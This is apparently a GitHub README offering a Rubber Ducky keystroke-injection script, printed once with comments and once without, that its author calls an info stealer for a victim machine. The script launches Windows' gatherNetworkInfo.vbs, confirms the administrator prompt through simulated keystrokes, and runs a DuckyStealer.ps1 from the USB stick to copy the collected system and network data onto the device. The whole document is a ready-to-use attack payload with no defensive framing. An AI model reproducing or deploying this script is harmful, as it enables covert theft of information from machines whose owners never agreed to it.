# Rubber_Ducky_Gather_Network_Info
A very quickly script for rubber ducky which exploits the gatherNetworkInfo.vbs file in the C: \ Windows \ System32 folder to steal different information from the victim machine.

![Alt text](https://github.com/JonnyBanana/Rubber_Ducky_Gather_Network_Info/blob/master/images/PrivacyPolicy.png "Rubber_Ducky_Gather_Network_Info by JonnyBanana")

<h2>Gather_Network_Info_Script</h2>

REM gathernetworkInfo a info stealer script by JonnyBanana
</BR>
REM https://github.com/JonnyBanana
</BR>
REM large delay beacause Windows require a lot of time to read the Ducky with twin duck firmware
DELAY 10000
GUI r
DELAY 200
STRING cmd  /C "start gatherNetworkInfo.vbs"  
DELAY 200
REM run as admin
CTRL ALT ENTER
DELAY 100
LEFTARROW
DELAY 100
ENTER
REM the scripts require a little of time to create the files....
DELAY 15000
CTRL ESC
DELAY 200
STRING powershell
DELAY 200
ENTER
DELAY 200
REM the Rubber Ducky MUST renamed on " _ " (bottom bar)
STRING .((gwmi win32_volume -f 'label=''_''').Name+'DuckyStealer.ps1')
DELAY 200
ENTER
REM the last command  takes about thirty seconds to copy all the informations
REM so be patient...



<h6>Script Without Comments</H6>

DELAY 10000
GUI R
DELAY 200
STRING cmd  /C "start gatherNetworkInfo.vbs"  
DELAY 200
CTRL-ALT ENTER
DELAY 100
LEFTARROW
DELAY 100
ENTER
DELAY 15000
CTRL ESC
DELAY 200
STRING powershell
DELAY 200
ENTER
DELAY 200
STRING .((gwmi win32_volume -f 'label=''_''').Name+'DuckyStealer.ps1')
DELAY 200
ENTER
